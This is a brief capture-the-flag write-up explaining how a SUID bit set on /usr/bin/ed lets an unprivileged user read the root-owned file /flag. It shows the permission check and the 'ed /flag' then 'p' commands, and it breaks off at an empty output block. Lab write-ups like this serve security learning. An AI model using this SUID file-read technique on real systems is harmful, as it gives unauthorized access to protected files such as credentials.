## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/ed`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/ed
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/ed
```

- The `s` in `-rws` indicates it's a SUID binary.
- `ed` runs with **root privileges**.

## 🚀 Exploitation

The `ed` command is a line-oriented text editor in Unix/Linux — it's one of the oldest editors, and it's still present on nearly all Unix-like systems. I

When the ed termianl arise we can use p to print the content of /flag

```bash
ed /flag
p
```

Output:
```
